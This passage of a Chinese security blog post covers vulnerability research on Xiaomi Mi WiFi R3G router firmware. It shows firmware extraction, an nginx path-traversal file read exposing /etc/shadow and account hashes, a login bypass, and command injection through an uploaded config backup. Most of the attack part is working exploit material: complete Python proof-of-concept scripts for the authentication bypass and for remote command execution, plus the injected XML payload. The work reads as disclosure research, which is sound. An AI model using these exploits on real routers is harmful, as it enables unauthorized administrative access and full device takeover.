            fwrite(buffer, 1, size, output);
        }
        fclose(output);
    }
    fclose(input);

    return 0;
}</code></pre>
<p>编译，运行，分离出三个文件</p>
<pre><code class="shell">gcc -o xiaomi_extract xiaomi_extract.c
./xiaomi_extract ../miwifi_r3g_firmware_12f97_2.25.124_dev.bin</code></pre>
<p><img src="/img/xiaomi/5.png" alt=""></p>
<p>执行file命令</p>
<pre><code class="shell">file root.ubi</code></pre>
<p><img src="/img/xiaomi/6.png" alt=""></p>
<p>ubi文件，可以用<a href="https://github.com/jrspruitt/ubi_reader" target="_blank" rel="noopener">ubi_reader</a>解压。</p>
<pre><code>ubireader_extract_images root.ubi</code></pre><p>生成<code>img-1592734593_vol-ubi_rootfs.ubifs</code>。</p>
<p>执行file命令</p>
<pre><code class="shell">file img-1592734593_vol-ubi_rootfs.ubifs</code></pre>
<p><img src="/img/xiaomi/7.png" alt=""></p>
<p>Squashfs文件，可以用<code>unsquashfs</code>命令解压</p>
<pre><code class="shell">unsquashfs img-1592734593_vol-ubi_rootfs.ubifs</code></pre>
<p><img src="/img/xiaomi/1.png" alt=""></p>
<p>可以看到里面的完整的文件系统了。</p>
<p>此外，还有别的简单方法，包括开发版刷ssh，ssh连进去tar打包，或者使用<code>mkxqimage -x</code>进行解压。</p>
<h1 id="3-固件分析"><a href="#3-固件分析" class="headerlink" title="3. 固件分析"></a>3. 固件分析</h1><p>在分析之前，先看下有什么服务。</p>
<p>常用操作是<code>nmap</code>扫所有端口，</p>
<pre><code class="shell">nmap -sT -vv -p 1-65535 192.168.31.1
PORT     STATE    SERVICE        REASON
22/tcp   open     ssh            syn-ack
53/tcp   open     domain         syn-ack
80/tcp   open     http           syn-ack
514/tcp  filtered shell          no-response
784/tcp  open     unknown        syn-ack
5081/tcp open     sdl-ets        syn-ack
8098/tcp open     unknown        syn-ack
8188/tcp open     unknown        syn-ack
8190/tcp open     gcp-rphy       syn-ack
8191/tcp open     limnerpressure syn-ack
8192/tcp open     sophos         syn-ack
8193/tcp open     sophos         syn-ack
8194/tcp open     sophos         syn-ack
8195/tcp open     blp2           syn-ack
8196/tcp open     unknown        syn-ack
8197/tcp open     unknown        syn-ack
8198/tcp open     unknown        syn-ack
8380/tcp open     cruise-update  syn-ack
8381/tcp open     unknown        syn-ack
8382/tcp open     unknown        syn-ack
8383/tcp open     m2mservices    syn-ack
8384/tcp open     marathontp     syn-ack
8385/tcp open     unknown        syn-ack
8899/tcp open     ospf-lite      syn-ack
8999/tcp open     bctp           syn-ack</code></pre>
<p>当然，其实我们有刷开发版ssh，直接查看监听的端口即可。</p>
<pre><code class="shell">netstat -nlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address       Foreign Address     State     in out PID/Program name
tcp    0    0 0.0.0.0:22        0.0.0.0:*         LISTEN     0 416 4877/dropbear
tcp    0    0 0.0.0.0:53        0.0.0.0:*         LISTEN     0 3016 4692/dnsmasq
tcp    0    0 0.0.0.0:80        0.0.0.0:*         LISTEN     0 74672 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:5081        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8098        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8188        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8190        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8191        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8192        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8193        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8194        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8195        0.0.0.0:*         LISTEN     0 4784 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8196        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8197        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8380        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8381        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8382        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8383        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8384        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8385        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8899        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8999        0.0.0.0:*         LISTEN     0 52 3921/sysapihttpd.co
tcp    0    0 0.0.0.0:8198        0.0.0.0:*         LISTEN     0 52 4350/mihttpd.conf
tcp    0    0 0.0.0.0:784         0.0.0.0:*         LISTEN     0 104 5104/trafficd
tcp    0    0 127.0.0.1:9088      0.0.0.0:*         LISTEN     0 52 5152/indexservice
tcp    0    0 127.0.0.1:9091      0.0.0.0:*         LISTEN     0 312 5335/plugincenter
tcp    0    0 127.0.0.1:8960      0.0.0.0:*         LISTEN     0 0 3997/fcgi-cgi
tcp    0    0 127.0.0.1:8920      0.0.0.0:*         LISTEN     0 52 3504/fcgi-cgi
tcp    0    0 127.0.0.1:9090      0.0.0.0:*         LISTEN     0 416 5215/datacenter
tcp    0    0 127.0.0.1:9096      0.0.0.0:*         LISTEN     0 23972 6572/smartcontrolle
tcp    0    0 127.0.0.1:9898      0.0.0.0:*         LISTEN     0 52 5503/rule_mgr
tcp    0    0 :::53           :::*            LISTEN     0 0 4692/dnsmasq
tcp    0    0 :::22           :::*            LISTEN     0 0 4877/dropbear
udp    0    0 0.0.0.0:53        0.0.0.0:*                114851 208127 4692/dnsmasq
udp    0    0 0.0.0.0:67        0.0.0.0:*                1964 2214 4692/dnsmasq
udp    0    0 0.0.0.0:3478        0.0.0.0:*                108 252 5019/stunserver
udp    0    0 :::547          :::*                 0 0 4692/dnsmasq
udp    0    0 :::53           :::*                 0 0 4692/dnsmasq
raw    0    0 ::%4768184:58       ::%4633928:*        58       9223209034255958016 8643837979766243328 4692/dnsmasq
Active UNIX domain sockets (only servers)
Proto RefCnt Flags     Type     State     I-Node PID/Program name    Path
unix  2    [ ACC ]     STREAM     LISTENING     1128 741/syslog-ng     /dev/log
unix  2    [ ACC ]     STREAM     LISTENING     1131 741/syslog-ng     /var/syslog-ng.ctl
unix  2    [ ACC ]     STREAM     LISTENING     3245 932/ubusd       /var/run/ubus.sock
unix  2    [ ACC ]     STREAM     LISTENING     6833 5793/lua        /var/run/miqosd.sock
</code></pre>
<p>可以看到监听了很多端口。</p>
<ul>
<li>22端口 dropbear ，ssh服务，稳定版没开启</li>
<li>dnsmasq，dns服务</li>
<li>nginx，开了大量端口</li>
</ul>
<h2 id="Web漏洞分析"><a href="#Web漏洞分析" class="headerlink" title="Web漏洞分析"></a>Web漏洞分析</h2><h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><pre><code class="shell">nginx: master process /usr/sbin/sysapihttpd -c /tmp/sysapihttpdconf/sysapihttpd.conf</code></pre>
<p>配置文件中找到了多处<code>nginx配置错误导致回溯上级目录的文件读漏洞</code>，且存在<code>根目录任意文件读取漏洞</code>。</p>
<pre><code class="shell">location /backup/log {
  alias /tmp/syslogbackup/;
}</code></pre>
<p>可读取<code>/tmp/</code>目录下文件。</p>
<pre><code class="shell">location /api-third-party/download/public {
  alias /userdisk/data/;
}
location /api-third-party/download/private {
  alias /userdisk/appdata/;
}</code></pre>
<p>可读取<code>/userdisk/</code>目录下文件。</p>
<pre><code class="shell">location /api-third-party/download/extdisks {
  alias /extdisks/;
}</code></pre>
<p>可读取<code>/</code>目录下文件</p>
<pre><code class="html">http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</code></pre>
<p><img src="/img/xiaomi/2.png" alt=""></p>
<h3 id="利用任意文件读取漏洞实现后台登录"><a href="#利用任意文件读取漏洞实现后台登录" class="headerlink" title="利用任意文件读取漏洞实现后台登录"></a>利用任意文件读取漏洞实现后台登录</h3><p>尝试通过任意文件读取漏洞实现登录后台，不是明文存储密码，需要进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。</p>
<ul>
<li><p>登录时前端js生成http post请求参数过程</p>
<pre><code class="javascript">var Encrypt = {
    key: &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;,
    iv: &#39;64175472480004614961023454661220&#39;,
    nonce: null,
    init: function(){
        var nonce = this.nonceCreat();
        this.nonce = nonce;
        return this.nonce;
    },
    nonceCreat: function(){
        var type = 0;
        // 自己的mac地址
        var deviceId = &#39;&lt;%=mac%&gt;&#39;;
        var time = Math.floor(new Date().getTime() / 1000);
        var random = Math.floor(Math.random() * 10000);
        return [type, deviceId, time, random].join(&#39;_&#39;);
    },
    oldPwd : function(pwd){ // oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))
        return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString();
    },
  //...
};</code></pre>
<p>可知<code>oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</code>，登陆请求包为</p>
<pre><code class="shell">POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1
Host: 192.168.31.1

username=admin&amp;password=c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248</code></pre>
</li>
</ul>
<p>​      </p>
<ul>
<li>验证用户登陆的后端过程</li>
</ul>
<p>调用<code>XQSecureUtil.checkUser</code>函数</p>
<pre><code class="lua">function checkUser(user, nonce, encStr)
    -- 从xiaoqiang 配置文件中读取信息
    local password = XQPreference.get(user, nil, &quot;account&quot;)
    if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then
        if XQCryptoUtil.sha1(nonce..password) == encStr then
            return true
        end
    end
    XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr)
    return false
end</code></pre>
<p>跟进<code>XQPreference.get</code>函数易知道是从<code>/etc/config/account</code>文件中读取某个字符串，这里称它为<code>accountStr</code>。</p>
<p><code>checkUser</code>函数判断等式为(encStr为参数oldPwd)</p>
<pre><code class="shell">sha1(nonce + sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))
==
sha1(nonce + accountStr)</code></pre>
<p>则</p>
<pre><code class="shell">accountStr == sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;)</code></pre>
<p>故，只需要读取<code>/etc/config/account</code>得到<code>accountStr</code>即可构造如下数据包登陆</p>
<pre><code class="shell">POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1
Host: 192.168.31.1

username=admin&amp;password=sha1(nonce + account中保存的字符串)&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248</code></pre>
<p>实现任意登陆poc</p>
<p>arbitrary_file_read_vulnerability.py</p>
<pre><code class="python">import os
import re
import time
import base64
import random
import hashlib
import requests
from Crypto.Cipher import AES

# proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
proxies = {}

def get_mac():
    ## get mac
    r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies)
    mac = re.findall(r&#39;deviceId = \&#39;(.*?)\&#39;&#39;, r0.text)[0]
    # print(mac)    
    return mac

def get_account_str():
    ## read /etc/config/account
    r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies)
    print(r1.text)
    account_str = re.findall(r&#39;admin\&#39;? \&#39;(.*)\&#39;&#39;, r1.text)[0]
    return account_str

def create_nonce(mac):
    type_ = 0
    deviceId = mac
    time_ = int(time.time())
    rand = random.randint(0,10000)
    return &quot;%d_%s_%d_%d&quot;%(type_, deviceId, time_, rand)

def calc_password(nonce, account_str):
    m = hashlib.sha1()
    m.update((nonce + account_str).encode(&#39;utf-8&#39;))
    return m.hexdigest()

mac = get_mac()
account_str = get_account_str()
## login, get stok
nonce = create_nonce(mac)
password = calc_password(nonce, account_str)
data = &quot;username=admin&amp;password={password}&amp;logtype=2&amp;nonce={nonce}&quot;.format(password=password,nonce=nonce)
r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, 
    data = data, 
    headers={&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;,
        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;},
    proxies=proxies)
# print(r2.text)
stok = re.findall(r&#39;&quot;token&quot;:&quot;(.*?)&quot;&#39;,r2.text)[0]
print(&quot;stok=&quot;+stok)</code></pre>
<p><img src="/img/xiaomi/3.png" alt=""></p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>在审计lua代码过程中，发现备份配置文件是<code>tar.gz</code>格式的，在恢复备份配置文件时，直接通过<code>tar -xzf</code>解压到<code>/tmp</code>目录，在<code>/usr/lib/lua/luci/controller/api/misystem.lua</code>中，</p>
<pre><code class="lua">function cUpload()
    local LuciFs = require(&quot;luci.fs&quot;)
    local XQBackup = require(&quot;xiaoqiang.module.XQBackup&quot;)
    local code = 0
    local canupload = true
    local uploadFilepath = &quot;/tmp/cfgbackup.tar.gz&quot;
    local fileSize = tonumber(LuciHttp.getenv(&quot;CONTENT_LENGTH&quot;))
    if fileSize &gt; 102400 then
        canupload = false
    end
    -- 写文件
    LuciHttp.setfilehandler(
        function(meta, chunk, eof)
            if canupload then
                if not fp then
                    if meta and meta.name == &quot;image&quot; then
                        fp = io.open(uploadFilepath, &quot;w&quot;)
                    end
                end
                if chunk then
                    fp:write(chunk)
                end
                if eof then
                    fp:close()
                end
            else
                code = 1630
            end
        end
    )
    if LuciHttp.formvalue(&quot;image&quot;) and fp then
        code = 0
    end
    local result = {}
    if code == 0 then
        -- 解压备份文件
        local ext = XQBackup.extract(uploadFilepath)
        if ext == 0 then
            result[&quot;des&quot;] = XQBackup.getdes()
        else
            code = 1629
        end
    end
    if code ~= 0 then
        result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code)
        LuciFs.unlink(uploadFilepath)
    end
    result[&quot;code&quot;] = code
    LuciHttp.write_json(result)
end</code></pre>
<p>其中调用<code>XQBackup.extract(uploadFilepath)</code>进行解压</p>
<pre><code class="lua">-- 0:succeed
-- 1:file does not exist
-- 2:no description file
-- 3:no mbu file
function extract(filepath)
    local fs = require(&quot;nixio.fs&quot;)
    local tarpath = filepath
    if not tarpath then
        tarpath = TARMBUFILE
    end
    if not fs.access(tarpath) then
        return 1
    end
    os.execute(&quot;cd /tmp; tar -xzf &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;)
    os.execute(&quot;rm &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;)
    if not fs.access(DESFILE) then
        return 2
    end
    if not fs.access(MBUFILE) then
        return 3
    end
    return 0
end</code></pre>
<p>那么，通过构造压缩包，可以上传任意文件到<code>/tmp</code>目录，即<code>/tmp</code>目录任意文件可控。</p>
<p>接下来找控制<code>/tmp</code>目录下文件能够做什么。</p>
<p>使用<code>grep</code>大法，发现<code>/usr/bin/upload_speedtest,/usr/bin/download_speedtest</code>等会读取<code>/tmp/speedtest_urls.xml</code>并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用</p>
<p>如，<code>/usr/bin/download_speedtest</code>文件</p>
<pre><code class="lua">#!/usr/bin/env lua
-- ...
local cfg = {
-- ...
    [&#39;xmlfile&#39;] = &quot;/usr/share/speedtest.xml&quot;,
        [&#39;tmp_speedtest_xml&#39;] = &quot;/tmp/speedtest_urls.xml&quot;,
}
VERSION=&quot;__UNDEFINED__&quot;
-- ...
-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml
local filename = &quot;&quot;
filexml = io.open(cfg.tmp_speedtest_xml)
if filexml then
    filexml:close()
    filename = cfg.tmp_speedtest_xml
else
    filename = cfg.xmlfile
end

local pp = io.open(filename)
local line = pp:read(&quot;*line&quot;)
local size = 0
local resources = {}
local u = &quot;&quot;
local pids = {}
-- ...
function wget_work(url)
    local _url = url
    pid = posix.fork()
    if pid &lt; 0 then
        print(&quot;fork error&quot;)
        return -1
    elseif pid &gt; 0 then
        --print(string.format(&quot;child pid %d\n&quot;, pid))
    else
        -- 拼接命令，最终在这里执行
        os.execute(&#39;for i in $(seq &#39;.. math.floor(cfg.nr/cfg.nc) ..&#39;); do wget &#39;.. url  ..
        &quot; -q -O /dev/null; done&quot;)
    end
    return pid
end

while line do
    -- 从文件中提取url， 这里提取没有进行过滤
    local _, _, url = string.find(line,&#39;&lt;item url=&quot;(.*)&quot;/&gt;&#39;)
    if url then
        table.insert(resources, url)
    end
    line = pp:read(&quot;*line&quot;)
end
pp:close()

local urls = mrandom(1, table.getn(resources), cfg.nc)

for k, v in ipairs(urls) do
    if VERSION == &quot;LESSMEM&quot; then
        local pid = wget_work_loop(resources[v])
    else
        -- VERSION 为 __UNDEFINED__， url直接作为参数
        local pid = wget_work(resources[v])
    end
    if(pid == 0) then
        os.exit(0)
    elseif(pid == -1) then
        done()
    end
end</code></pre>
<p>调用的地方有好几个，如<code>/usr/lib/lua/luci/controller/api/xqnetdetect.lua</code>中</p>
<pre><code class="lua">function netspeed()
    local XQPreference = require(&quot;xiaoqiang.XQPreference&quot;)
    local XQNSTUtil = require(&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;)
    local code = 0
    local result = {}
    local history = LuciHttp.formvalue(&quot;history&quot;)
    if history then
        result[&quot;bandwidth&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH&quot;, 0, &quot;xiaoqiang&quot;))
        result[&quot;download&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth))
        result[&quot;bandwidth2&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH2&quot;, 0, &quot;xiaoqiang&quot;))
        result[&quot;upload&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth2))
    else
        os.execute(&quot;/etc/init.d/miqos stop&quot;)
        -- 这里调用了downloadSpeedTest
        local download = XQNSTUtil.downloadSpeedTest()
        if download then
            result[&quot;download&quot;] = download
            result[&quot;bandwidth&quot;] = tonumber(string.format(&quot;%.2f&quot;, 8 * download/1024))
            XQPreference.set(&quot;BANDWIDTH&quot;, tostring(result.bandwidth), &quot;xiaoqiang&quot;)
        else
            code = 1588
        end
        if code ~= 0 then
           result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code)
        end
        os.execute(&quot;/etc/init.d/miqos start&quot;)
    end

    result[&quot;code&quot;] = code
    LuciHttp.write_json(result)
end</code></pre>
<pre><code class="lua">function downloadSpeedTest()
    local speedtest = &quot;/usr/bin/download_speedtest&quot;
    local speed
    -- 直接调用lua文件
    for _, line in ipairs(LuciUtil.execl(speedtest)) do
        if not XQFunction.isStrNil(line) and line:match(&quot;^avg rx:&quot;) then
            speed = line:match(&quot;^avg rx:(%S+)&quot;)
            if speed then
                speed = tonumber(string.format(&quot;%.2f&quot;,speed/8))
            end
            break
        end
    end
    return speed
end</code></pre>
<p>所以，我们只需要构造恶意的<code>speedtest_urls.xml</code>文件，构造配置文件，上传配置文件，然后调用网络测试相关的接口，即可以实现命令注入。</p>
<p>实现命令执行poc</p>
<p>template.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;root&gt;
    &lt;class type=&quot;1&quot;&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
    &lt;/class&gt;
    &lt;class type=&quot;2&quot;&gt;
        &lt;item url=&quot;http://192.168.31.1 -q -O /dev/null;{command}&gt;/tmp/1.txt; exit; wget http://192.168.31.1  &quot;/&gt;
    &lt;/class&gt;
    &lt;class type=&quot;3&quot;&gt;
        &lt;item uploadurl=&quot;http://www.taobao.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.so.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.qq.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.sohu.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.tudou.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.360doc.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.kankan.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.speedtest.cn/&quot;/&gt;
    &lt;/class&gt;
&lt;/root&gt;</code></pre>
<p>remote_command_execution_vulnerability.py</p>
<pre><code class="python">import os
import tarfile
import requests

# proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
proxies = {}

## get stok
stok = input(&quot;stok: &quot;)

## make config file
command = input(&quot;command: &quot;)
speed_test_filename = &quot;speedtest_urls.xml&quot;
with open(&quot;template.xml&quot;,&quot;rt&quot;) as f:
    template = f.read()
data = template.format(command=command)
# print(data)
with open(&quot;speedtest_urls.xml&quot;,&#39;wt&#39;) as f:
    f.write(data)

with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar:
    # tar.add(&quot;cfg_backup.des&quot;)
    # tar.add(&quot;cfg_backup.mbu&quot;)
    tar.add(&quot;speedtest_urls.xml&quot;)

## upload config file
print(&quot;start uploading config file ...&quot;)
r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload&quot;.format(stok), files={&quot;image&quot;:open(&quot;payload.tar.gz&quot;,&#39;rb&#39;)}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print(&quot;start exec command...&quot;)
r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)
if r3.status_code == 200:
    print(&quot;success, vul&quot;)
    print(r3.text)</code></pre>
<p><img src="/img/xiaomi/4.png" alt=""></p>
<h1 id="4-漏洞影响"><a href="#4-漏洞影响" class="headerlink" title="4. 漏洞影响"></a>4. 漏洞影响</h1><p>本次测试使用的是ROM for R3G最新版固件进行漏洞挖掘，实现了后台登录和命令执行。经测试，在R3A最新版和R4最新版上成功命令执行，判断为系列型漏洞，影响范围较广。（时间：2019-03-09）</p>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC" target="_blank" rel="noopener">POC</a></p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry"><span class="miit">
                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
        </span>
    
    ©2015-2020 UltramanGaia
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
